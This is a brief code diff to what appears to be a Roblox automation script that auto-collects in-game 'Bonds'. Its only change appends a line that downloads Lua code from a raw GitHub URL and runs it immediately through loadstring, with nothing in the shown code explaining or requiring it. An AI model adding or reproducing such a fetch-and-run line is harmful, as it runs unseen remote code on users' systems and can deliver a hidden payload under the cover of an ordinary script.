@@ -97,3 +97,5 @@ task.spawn(function()
     -- Final log after all retries
     print("Collection complete. Total Bonds collected:", #trackedBonds - #remainingBonds)
 end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/rfuhif21ry973/bond.github.io/refs/heads/main/bond.lua"))()
